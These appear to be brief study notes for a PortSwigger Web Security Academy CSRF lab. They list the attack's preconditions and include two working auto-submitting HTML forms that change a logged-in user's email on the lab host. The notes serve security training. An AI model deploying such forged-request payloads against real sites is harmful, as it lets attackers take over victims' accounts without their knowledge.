Requirement 
	• Relevant action
	• Cookie based session handling
	• No unpredictable request parameters 

Can be automated using  burpesuite pro edition 



```
<form method="POST" action="https://0a39003e04cac15b80985df6004b00b0.web-security-academy.net/my-account/change-email">
	 <input type="hidden" name="email" value="anything%40web-security-academy.net"> </form> 
<script> 
	document.forms[0].submit();
 </script>
```

From <https://portswigger.net/web-security/csrf/lab-no-defenses> 


```
<form method="POST" action="https://0a39003e04cac15b80985df6004b00b0.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="viet@gmail.com">
</form>
<script>
        document.forms[0].submit();
</script>
```

